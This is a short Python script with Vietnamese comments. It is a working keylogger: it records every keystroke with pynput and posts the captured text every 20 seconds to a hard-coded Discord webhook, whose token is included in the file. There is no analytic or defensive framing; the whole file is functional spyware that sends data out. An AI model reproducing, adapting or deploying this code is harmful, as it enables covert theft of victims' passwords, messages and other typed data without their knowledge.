from pynput import keyboard
import threading
import requests

SEND_INTERVAL = 20  # Thời gian gửi log mỗi 60 giây
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1388721001533014096/JF3xemzvy5U97Ejrl-BIU2x19cOR_NHoBBk9zJgciwyaGPhgCOtMsPGrmO35qr1224a-"

log_data = ""

def on_press(key):
    global log_data
    try:
        log_data += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log_data += " "
        elif key == keyboard.Key.enter:
            log_data += "\n"
        else:
            log_data += f"[{key.name}]"
    print(log_data)  # Tạm để debug

def send_log():
    global log_data
    if log_data:
        try:
            requests.post(DISCORD_WEBHOOK_URL, json={"content": f"[LOG]: {log_data}"})
        except:
            print("Gửi log thất bại.")
        log_data = ""
    threading.Timer(SEND_INTERVAL, send_log).start()

def start_logger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    send_log()
    listener.join()

start_logger()
